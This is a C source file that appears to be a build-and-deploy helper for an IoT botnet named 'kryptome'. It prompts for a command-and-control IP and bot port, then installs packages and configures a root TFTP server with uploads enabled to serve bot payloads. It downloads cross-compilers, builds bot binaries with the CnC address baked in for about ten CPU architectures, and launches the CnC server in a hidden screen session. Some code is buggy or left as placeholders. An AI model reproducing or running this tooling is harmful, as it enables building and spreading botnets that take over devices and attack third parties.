#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

//Types of DNS resource records :)
 
#define T_A 1 //Ipv4 address
#define T_NS 2 //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6 /* start of authority zone */
#define T_PTR 12 /* domain name pointer */
#define T_MX 15 //Mail server
 
//DNS header structure
struct DNS_HEADER
{
    unsigned short id; // identification number
 
    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag
 
    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available
 
    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};
 
//Constant sized fields of query structure
struct QUESTION
{
    unsigned short qtype;
    unsigned short qclass;
};
 
//Constant sized fields of the resource record structure
#pragma pack(push, 1)
struct R_DATA
{
    unsigned short type;
    unsigned short _class;
    unsigned int ttl;
    unsigned short data_len;
};
#pragma pack(pop)
 
//Pointers to resource record contents
struct RES_RECORD
{
    unsigned char *name;
    struct R_DATA *resource;
    unsigned char *rdata;
};
 
//Structure of a Query
typedef struct
{
    unsigned char *name;
    struct QUESTION *ques;
} QUERY;

 
//Function Prototypes
uint32_t ngethostbyname (unsigned char* , int);
void ChangetoDnsNameFormat (unsigned char*,unsigned char*);
unsigned char* ReadName (unsigned char*,unsigned char*,int*);
uint32_t get_dns_servers();

struct cross_compilas_t
{
    char name[32];
    char output_name[32];
    char url[128];
    int build_id;
};

struct cross_compilas_t **compilas = {NULL};
int compilas_len = 0;

void add_compila(int build_id, char *name, char *output_name, char *url)
{
    struct cross_compilas_t *compila;
    
    compilas = realloc(compilas, (compilas_len+1)*sizeof(struct cross_compilas_t *));
    compilas[compilas_len] = malloc(sizeof(struct cross_compilas_t));
    compila = compilas[compilas_len];
    compilas_len++;

    strcpy(compila->name, name);
    strcpy(compila->output_name, output_name);
    strcpy(compila->url, url);
    compila->build_id = build_id;
}

void load_cross_compilers()
{
    add_compila(0, "armv4l",  "arm",    "uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2");
    add_compila(1, "armv5l",  "arm5",   "uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2");
    add_compila(2, "armv6l",  "arm6",   "distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2");
    add_compila(3, "mips",    "mips",   "uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2");
    add_compila(4, "mipsel",  "mpsl",   "uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2");
    add_compila(5, "i586",    "x86",    "uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2");
    add_compila(6, "i686",    "i686", "uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2");
    add_compila(7, "x86_64",  "x86_64", "uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2");
    add_compila(8, "powerpc", "ppc",    "uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2");
    add_compila(9, "sh4",     "sh4",    "uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2");
    add_compila(10, "armv7l",  "arm7",  "balls");
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
    register int iop;
    int pdes[2], fds, pid;

    if (*type != 'r' && *type != 'w' || type[1]) return -1;

    if (pipe(pdes) < 0) return -1;
    if (fdopen_pids == NULL) {
        if ((fds = getdtablesize()) <= 0) return -1;
        if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
        memset((unsigned char *)fdopen_pids, 0, sizeof(fdopen_pids));
    }

    switch (pid = vfork())
    {
    case -1:
        close(pdes[0]);
        close(pdes[1]);
        return -1;
    case 0:
        if (*type == 'r') {
            if (pdes[1] != 1) {
                dup2(pdes[1], 1);
                close(pdes[1]);
            }
            close(pdes[0]);
        } else {
            if (pdes[0] != 0) {
                (void) dup2(pdes[0], 0);
                (void) close(pdes[0]);
            }
            (void) close(pdes[1]);
        }
        execl("/bin/sh", "sh", "-c", program, NULL);
        _exit(0);
    }
    if (*type == 'r') {
        iop = pdes[0];
        (void) close(pdes[1]);
    } else {
        iop = pdes[1];
        (void) close(pdes[0]);
    }
    fdopen_pids[iop] = pid;
    return (iop);
}

int fdpclose(int iop)
{
    sigset_t omask, nmask;
    int pstat;
    register int pid;

    if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
    (void) close(iop);
    sigemptyset(&nmask);
    sigaddset(&nmask, SIGINT);
    sigaddset(&nmask, SIGQUIT);
    sigaddset(&nmask, SIGHUP);
    (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
    do {
        pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
    } while (pid == -1 && errno == EINTR);
    (void) sigprocmask(SIG_SETMASK, &omask, NULL);
    return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got == 0 ? NULL : buffer;
}

void run_command(char *run_cmd, int print_output)
{
    unsigned char buf[512];
    int command;
    memset(buf, 0, 512);
    command = fdpopen(run_cmd, "r");   
	while(fdgets(buf, 511, command) != NULL) {
        if(print_output == 1)
        {
            printf("got command buff: [%s]\r\n", buf);
        }
        memset(buf, 0, 512);
    }
    fdpclose(command);
    return;
}

uint32_t ngethostbyname(unsigned char *host , int query_type)
{
    unsigned char buf[65536],*qname,*reader;
    int i , j , stop , s;
 
    struct sockaddr_in a;
 
    struct RES_RECORD answers[20],auth[20],addit[20]; //the replies from the DNS server
    struct sockaddr_in dest;
 
    struct DNS_HEADER *dns = NULL;
    struct QUESTION *qinfo = NULL;
 
    s = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP); //UDP packet for DNS queries
 
    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = get_dns_servers(); //dns servers
 
    //Set the DNS structure to standard queries
    dns = (struct DNS_HEADER *)&buf;
 
    dns->id = (unsigned short) htons(getpid());
    dns->qr = 0; //This is a query
    dns->opcode = 0; //This is a standard query
    dns->aa = 0; //Not Authoritative
    dns->tc = 0; //This message is not truncated
    dns->rd = 1; //Recursion Desired
    dns->ra = 0; //Recursion not available! hey we dont have it (lol)
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1); //we have only 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;
 
    //point to the query portion
    qname =(unsigned char*)&buf[sizeof(struct DNS_HEADER)];
 
    ChangetoDnsNameFormat(qname , host);
    qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it
 
    qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
    qinfo->qclass = htons(1); //its internet (lol)
 
    if( sendto(s,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&dest,sizeof(dest)) < 0)
    {
        perror("sendto failed");
    }

    //Receive the answer
    i = sizeof dest;
    if(recvfrom (s,(char*)buf , 65536 , 0 , (struct sockaddr*)&dest , (socklen_t*)&i ) < 0)
    {
        perror("recvfrom failed");
    }

    dns = (struct DNS_HEADER*) buf;
 
    //move ahead of the dns header and the query field
    reader = &buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION)];

    //Start reading answers
    stop=0;
 
    for(i=0;i<ntohs(dns->ans_count);i++)
    {
        answers[i].name=ReadName(reader,buf,&stop);
        reader = reader + stop;
 
        answers[i].resource = (struct R_DATA*)(reader);
        reader = reader + sizeof(struct R_DATA);
 
        if(ntohs(answers[i].resource->type) == 1) //if its an ipv4 address
        {
            answers[i].rdata = (unsigned char*)malloc(ntohs(answers[i].resource->data_len));
 
            for(j=0 ; j<ntohs(answers[i].resource->data_len) ; j++)
            {
                answers[i].rdata[j]=reader[j];
            }
 
            answers[i].rdata[ntohs(answers[i].resource->data_len)] = '\0';
 
            reader = reader + ntohs(answers[i].resource->data_len);
        }
        else
        {
            answers[i].rdata = ReadName(reader,buf,&stop);
            reader = reader + stop;
        }
    }
 
    //read authorities
    for(i=0;i<ntohs(dns->auth_count);i++)
    {
        auth[i].name=ReadName(reader,buf,&stop);
        reader+=stop;
 
        auth[i].resource=(struct R_DATA*)(reader);
        reader+=sizeof(struct R_DATA);
 
        auth[i].rdata=ReadName(reader,buf,&stop);
        reader+=stop;
    }
 
    //read additional
    for(i=0;i<ntohs(dns->add_count);i++)
    {
        addit[i].name=ReadName(reader,buf,&stop);
        reader+=stop;
 
        addit[i].resource=(struct R_DATA*)(reader);
        reader+=sizeof(struct R_DATA);
 
        if(ntohs(addit[i].resource->type)==1)
        {
            addit[i].rdata = (unsigned char*)malloc(ntohs(addit[i].resource->data_len));
            for(j=0;j<ntohs(addit[i].resource->data_len);j++)
            addit[i].rdata[j]=reader[j];
 
            addit[i].rdata[ntohs(addit[i].resource->data_len)]='\0';
            reader+=ntohs(addit[i].resource->data_len);
        }
        else
        {
            addit[i].rdata=ReadName(reader,buf,&stop);
            reader+=stop;
        }
    }
 
    //print answers
    for(i=0 ; i < ntohs(dns->ans_count) ; i++)
    {
 
        if( ntohs(answers[i].resource->type) == T_A) //IPv4 address
        {
            long *p;
            p=(long*)answers[i].rdata;
            return *p;
        }
         
        if(ntohs(answers[i].resource->type)==5) 
        {
            //Canonical name for an alias
        }
 
    }
 
    //print authorities
    for( i=0 ; i < ntohs(dns->auth_count) ; i++)
    {
         
        if(ntohs(auth[i].resource->type)==2)
        {
        }
        printf("\n");
    }
 
    //print additional resource records
    for(i=0; i < ntohs(dns->add_count) ; i++)
    {
        if(ntohs(addit[i].resource->type)==1)
        {
            long *p;
            p=(long*)addit[i].rdata;
            a.sin_addr.s_addr=(*p);
            return *p;
        }
    }
    return 0;
}

u_char* ReadName(unsigned char* reader,unsigned char* buffer,int* count)
{
    unsigned char *name;
    unsigned int p=0,jumped=0,offset;
    int i , j;
 
    *count = 1;
    name = (unsigned char*)malloc(256);
 
    name[0]='\0';
 
    //read the names in 3www6google3com format
    while(*reader!=0)
    {
        if(*reader>=192)
        {
            offset = (*reader)*256 + *(reader+1) - 49152; //49152 = 11000000 00000000 ;)
            reader = buffer + offset - 1;
            jumped = 1; //we have jumped to another location so counting wont go up!
        }
        else
        {
            name[p++]=*reader;
        }
 
        reader = reader+1;
 
        if(jumped==0)
        {
            *count = *count + 1; //if we havent jumped to another location then we can count up
        }
    }
 
    name[p]='\0'; //string complete
    if(jumped==1)
    {
        *count = *count + 1; //number of steps we actually moved forward in the packet
    }
 
    for(i=0;i<(int)strlen((const char*)name);i++) 
    {
        p=name[i];
        for(j=0;j<(int)p;j++) 
        {
            name[i]=name[i+1];
            i=i+1;
        }
        name[i]='.';
    }
    name[i-1]='\0';
    return name;
}
 
uint32_t get_dns_servers()
{
    
    int randx = rand() % 2;
    if(randx == 0) {
        return inet_addr("8.8.8.8");
    } else if (randx == 1) {
        return inet_addr("8.8.4.4");
    }

    return inet_addr("8.8.8.8");
}
 
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host) 
{
    int lock = 0 , i;
    strcat((char*)host,".");
     
    for(i = 0 ; i < strlen((char*)host) ; i++) 
    {
        if(host[i]=='.') 
        {
            *dns++ = i-lock;
            for(;lock<i;lock++) 
            {
                *dns++=host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++='\0';
}


static void parse_url(char *url, char *get_domain, char *get_path, int *get_port)
{
    if(strstr(url, "https//") != NULL) {
        #ifdef DEBUG
        printf("got port 443\r\n");
        #endif
        *get_port = 443;
    } else {
        #ifdef DEBUG
        printf("got port 80\r\n");
        #endif
        *get_port = 80;
    }

    char *tmp;
    char tmp_domain[512];
    char tmp_path[512];
    tmp = strchr(url, '/');
    #ifdef DEBUG
    printf("strchr 0 : %s\r\n", tmp);
    #endif
    tmp++;
    if(tmp[0] == '/') {// found // in https://
        tmp++;
        memset(tmp_domain, 0, 512);
        int tmp_domain_len = strcspn(tmp, "/");
        strncpy(tmp_domain, tmp, tmp_domain_len);
        tmp += tmp_domain_len;// now we are at https://example.com/

        memset(tmp_path, 0, 512);
        strncpy(tmp_path, tmp, strlen(tmp));
        tmp += strlen(tmp);

        strcpy(get_domain, tmp_domain);
        strcpy(get_path, tmp_path);

        #ifdef DEBUG
        printf("have domain %s and path %s\r\n", get_domain, get_path);
        #endif
    }
    
}

int isValidIpAddress(char *ipAddress)
{
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
    return result != 0;
}

int download_file(char *url, char *out_name) {
    char recvbuf[128];
    struct sockaddr_in addr;
    int sfd, ffd, ret;
    unsigned int header_parser = 0;

    char *get_domain = malloc(512);
    char *get_path = malloc(512);
    int get_port = -1;

    parse_url(url, get_domain, get_path, &get_port);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(get_port);
    if(!isValidIpAddress(get_domain)) {
        uint32_t address = ngethostbyname(get_domain, T_A);
        if(address == -1) {
            #ifdef DEBUG
            printf("failed to resolve address\r\n");
            #endif
            return;
        }
        addr.sin_addr.s_addr = address;
        #ifdef DEBUG
        printf("Resolved domain to: %d.%d.%d.%d\r\n", address & 0xff, (address >> 8) & 0xff, (address >> 16) & 0xff, (address >> 24) & 0xff);
        #endif
    } else {
        addr.sin_addr.s_addr = inet_addr(get_domain);
    }

    ffd = open(out_name, O_WRONLY | O_CREAT | O_TRUNC, 0777);

    sfd = socket(AF_INET, SOCK_STREAM, 0);

#ifdef DEBUG
    if (ffd == -1)
        printf("Failed to open file!\n");
    if (sfd == -1)
        printf("Failed to call socket()\n");
#endif

    if (sfd == -1 || ffd == -1)
        _exit(0);

#ifdef DEBUG
    printf("Connecting to host...\n");
#endif

    if ((ret = connect(sfd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in))) < 0)
    {
#ifdef DEBUG
        printf("Failed to connect to host.\n");
#endif
        _exit(0);
    }

#ifdef DEBUG
    printf("Connected to host\n");
#endif

    char sendbuf[512];
    strcpy(sendbuf, "GET ");
    strcpy(sendbuf+strlen(sendbuf), get_path);
    strcpy(sendbuf+strlen(sendbuf), " HTTP/1.0\r\nHost: ");
    strcpy(sendbuf+strlen(sendbuf), get_domain);
    strcpy(sendbuf+strlen(sendbuf), "\r\n\r\n");

    if (write(sfd, sendbuf, strlen(sendbuf)) != strlen(sendbuf))
    {
#ifdef DEBUG
        printf("Failed to send get request.\n");
#endif

        _exit(0);
    }

#ifdef DEBUG
    printf("Started header parse...\n");
#endif

    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(sfd, &ch, 1);

        if (ret != 1)
            _exit(0);
        header_parser = (header_parser << 8) | ch;
    }

#ifdef DEBUG
    printf("Finished receiving HTTP header\n");
#endif

    while (1)
    {
        int ret = read(sfd, recvbuf, sizeof (recvbuf));

        if (ret <= 0)
            break;
        write(ffd, recvbuf, ret);
    }

    close(sfd);
    close(ffd);
}

enum
{
    BUILD_STATE_PROMPT_IPA,
    BUILD_STATE_PROMPT_IPB,
    BUILD_STATE_PROMPT_IPC,
    BUILD_STATE_PROMPT_IPD,
    BUILD_STATE_PROMPT_BP,
    BUILD_STATE_PROMPT_INSTALL_DEPS,
    BUILD_STATE_PROMPT_COMP_CNC,
    BUILD_STATE_PROMPT_COMP_BOT,
    BUILD_STATE_PROMPT_DL_COMPILAS,
    BUILD_STATE_INSTALL_DEPS,
    BUILD_STATE_COMP_CNC,
    BUILD_STATE_COMP_BOT,
    BUILD_STATE_PROMPT_START_CNC,
    BUILD_STATE_START_CNC,
    BUILD_STATE_PROMPT_EXIT,
    BUILD_STATE_EXIT
};

int main(int argc, char **argv)
{
    char prompt_resp[128];
    uint8_t state = 0;

    int ipa = 0;
    int ipb = 0;
    int ipc = 0;
    int ipd = 0;
    int bp = 0;

    uint8_t install_deps = 0;
    uint8_t comp_cnc = 0;
    uint8_t comp_bot = 0;
    uint8_t dl_compilas = 0;
    uint8_t start_cnc = 0;

    load_cross_compilers();

    printf("Starting kryptome build sxript ~daddyl33t\r\n");
    while(state != BUILD_STATE_EXIT)
    {
        memset(prompt_resp, 0, 128);
        switch(state)
        {
            case BUILD_STATE_PROMPT_IPA:
                printf("Gimme 1st position of your cnc ip ([127].0.0.1) ~~~> ");
                scanf("%d", &ipa);
                state++;
                break;
            case BUILD_STATE_PROMPT_IPB:
                printf("Gimme 2nd position of your cnc ip (127.[0].0.1) ~~~> ");
                scanf("%d", &ipb);
                state++;
                break;
            case BUILD_STATE_PROMPT_IPC:
                printf("Gimme 3rd position of your cnc ip (127.0.[0].1) ~~~> ");
                scanf("%d", &ipc);
                state++;
                break;
            case BUILD_STATE_PROMPT_IPD:
                printf("Gimme 4th position of your cnc ip (127.0.0.[1]) ~~~> ");
                scanf("%d", &ipd);
                state++;
                break;
            case BUILD_STATE_PROMPT_BP:
                printf("Gimme the botport of your botnet ~~~> ");
                scanf("%d", &bp);
                state++;
                break;
            case BUILD_STATE_PROMPT_INSTALL_DEPS:
                printf("Would you like me to install dependencies? [Y/n] ~~~> ");
                scanf("%s", prompt_resp);
                if(prompt_resp[0] == 'Y' || prompt_resp[0] == 'y')
                {
                    install_deps = 1;
                } 
                else if(prompt_resp[0] == 'N' || prompt_resp[0] == 'n')
                {
                    install_deps = 0;
                }
                else
                {
                    break;
                }
                state++;
                break;
            case BUILD_STATE_PROMPT_COMP_CNC:
                printf("Would you like me to compile cnc? [Y/n] ~~~> ");
                scanf("%s", prompt_resp);
                if(prompt_resp[0] == 'Y' || prompt_resp[0] == 'y')
                {
                    comp_cnc = 1;
                } 
                else if(prompt_resp[0] == 'N' || prompt_resp[0] == 'n')
                {
                    comp_cnc = 0;
                }
                else
                {
                    break;
                }
                state++;
                break;
            case BUILD_STATE_PROMPT_COMP_BOT:
                printf("Would you like me to compile bot? [Y/n] ~~~> ");
                scanf("%s", prompt_resp);
                if(prompt_resp[0] == 'Y' || prompt_resp[0] == 'y')
                {
                    comp_bot = 1;
                } 
                else if(prompt_resp[0] == 'N' || prompt_resp[0] == 'n')
                {
                    comp_bot = 0;
                }
                else
                {
                    break;
                }
                state++;
                break;
            case BUILD_STATE_PROMPT_DL_COMPILAS:
                if(comp_bot == 1) 
                {
                    printf("Would you like me to download cross compilas? [Y/n] ~~~> ");
                    scanf("%s", prompt_resp);
                    if(prompt_resp[0] == 'Y' || prompt_resp[0] == 'y')
                    {
                        dl_compilas = 1;
                    } 
                    else if(prompt_resp[0] == 'N' || prompt_resp[0] == 'n')
                    {
                        dl_compilas = 0;
                    }
                    else
                    {
                        break;
                    }
                }
                state++;
                break;
            case BUILD_STATE_INSTALL_DEPS:
                if(install_deps == 1)
                {
                    printf("Installing Development Tools\r\n");
                    run_command("yum groupinstall \"Development Tools\"", 0);
                    printf("Installing gcc wget nano screen glibc-static tar bzip2\r\n");
                    run_command("yum install gcc wget nano screen glibc-static tar bzip2 -y", 0);
                    printf("Installing methods of bin retrieval\r\n");
                    run_command("yum install xinetd tftp-server httpd -y", 0);
                    FILE *fp = fopen("/etc/xinetd.d/tftp", "w");
                    if(!fp)
                    {
                        printf("FAILED TO SETUP TFTP SERVER\r\n");
                    }
                    else
                    {
/*
# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s /var/lib/tftpboot
        disable                 = yes
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
*/
                        fprintf(fp, "# default: off\r\n# description: The tftp server serves files using the trivial file transfer \\\r\n#       protocol.  The tftp protocol is often used to boot diskless \\\r\n#       workstations, download configuration files to network-aware printers, \\\r\n#       and to start the installation process for some operating systems.\r\n");
                        fflush(fp);
                        fprintf(fp, "service tftp\r\n");
                        fflush(fp);
                        fprintf(fp, "{\r\n");
                        fflush(fp);
                        fprintf(fp, "        socket_type             = dgram\r\n");
                        fflush(fp);
                        fprintf(fp, "        protocol                = udp\r\n");
                        fflush(fp);
                        fprintf(fp, "        wait                    = yes\r\n");
                        fflush(fp);
                        fprintf(fp, "        user                    = root\r\n");
                        fflush(fp);
                        fprintf(fp, "        server                  = /usr/sbin/in.tftpd\r\n");
                        fflush(fp);
                        fprintf(fp, "        server_args             = -c -s /var/lib/tftpboot\r\n");
                        fflush(fp);
                        fprintf(fp, "        disable                 = no\r\n");
                        fflush(fp);
                        fprintf(fp, "        per_source              = 11\r\n");
                        fflush(fp);
                        fprintf(fp, "        cps                     = 100 2\r\n");
                        fflush(fp);
                        fprintf(fp, "        flags                   = IPv4\r\n");
                        fflush(fp);
                        fprintf(fp, "}");
                        fflush(fp);
                        fclose(fp);
                    }
                    printf("Finished installing dependencies\r\n");
                }
                state++;
                break;
            case BUILD_STATE_COMP_CNC:
                if(comp_cnc == 1)
                {
                    printf("Compiling CnC\r\n");
                    run_command("gcc -o server cnc/*.c -lpthread -static", 1);
                    printf("Finished compiling CnC\r\n");
                }
                state++;
                break;
            case BUILD_STATE_COMP_BOT:
                if(comp_bot == 1)
                {
                    int i;
                    if(dl_compilas == 1)
                    {
                        run_command("rm -rf /etc/xcompile", 0);
                        run_command("mkdir /etc/xcompile", 0);
                        printf("Downloading & Extracting cross compilers into /etc/xcompile\r\n");
                        for(i = 0; i < compilas_len; i++)
                        {
                            char dl_out_name[64], dl_out_path_name[128];
                            memset(dl_out_name, 0, 64);
                            memset(dl_out_path_name, 0, 128);
                            sprintf(dl_out_name, "cross-compiler-%s.tar.bz2", compilas[i]->name);
                            sprintf(dl_out_path_name, "/etc/xcompile/%s", dl_out_name);
                            
                            // this simply will not work on uclib XD
                            //download_file(compilas[i]->url, dl_out_name);
                            
                            char cmd[128];
                            memset(cmd, 0, 128);
                            sprintf(cmd, "wget %s -O %s", compilas[i]->url, dl_out_path_name);
                            run_command(cmd, 1);

                            printf("Downloaded %s from %s\r\n", dl_out_name, compilas[i]->url);
        
                            memset(cmd, 0, 128);
                            sprintf(cmd, "cd /etc/xcompile; tar -xvf %s", dl_out_name);
                            run_command(cmd, 0);
                            printf("Extracted cross-compiler-%s from %s\r\n", compilas[i]->name, dl_out_name);
                        }
                    }

                    printf("Cross-Compiling bot/client now [%d.%d.%d.%d:%d]\r\n", ipa, ipb, ipc, ipd, bp);

                    char comp_bot_flags[128];
                    memset(comp_bot_flags, 0, 128);
                    sprintf(comp_bot_flags, "-DIPA=%d -DIPB=%d -DIPC=%d -DIPD=%d -DBP=%d", ipa, ipb, ipc, ipd, bp);

                    for(i = 0; i < compilas_len; i++)
                    {
                        char comp_bot_cmd[128];
                        memset(comp_bot_cmd, 0, 128);
                        sprintf(comp_bot_cmd, "/etc/xcompile/cross-compiler-%s/bin/%s-gcc -o FBI.%s -s bot/*.c -Os -static %s -DBUILD_NUMBER=%d", compilas[i]->name, compilas[i]->name, compilas[i]->output_name, comp_bot_flags, compilas[i]->build_id);
                        run_command(comp_bot_cmd, 1);
                        printf("Cross-Compiled %s binary\r\n", compilas[i]->name);
                    }
                }
                state++;
                break;
            case BUILD_STATE_PROMPT_START_CNC:
                printf("Would you like me to start cnc? [Y/n] ~~~> ");
                scanf("%s", prompt_resp);
                if(prompt_resp[0] == 'Y' || prompt_resp[0] == 'y')
                {
                    start_cnc = 1;
                } 
                else if(prompt_resp[0] == 'N' || prompt_resp[0] == 'n')
                {
                    start_cnc = 0;
                }
                else
                {
                    break;
                }
                state++;
                break;
            case BUILD_STATE_START_CNC:
                if(start_cnc == 1)
                {
                    char start_cmd[128];
                    memset(start_cmd, 0, 128);
                    sprintf(start_cmd, "screen -d -m -S cnc ./server %d 850 420", bp);// -d -m starts detached; -S set session name
                    run_command(start_cmd, 1);
                    printf("CnC has been screened on admin port 420\r\n");
                }
                state++;
                break;
            case BUILD_STATE_PROMPT_EXIT:
                printf("Kryptome finished compilation by daddyl33t's build helper!\r\n");
                printf("Press any key to exit ~~~> ");
                scanf("%s", prompt_resp);
                state++;
                break;
            case BUILD_STATE_EXIT:
                return 0;
                break;
            default:
                state = BUILD_STATE_EXIT;
                break;
        }
    }
}
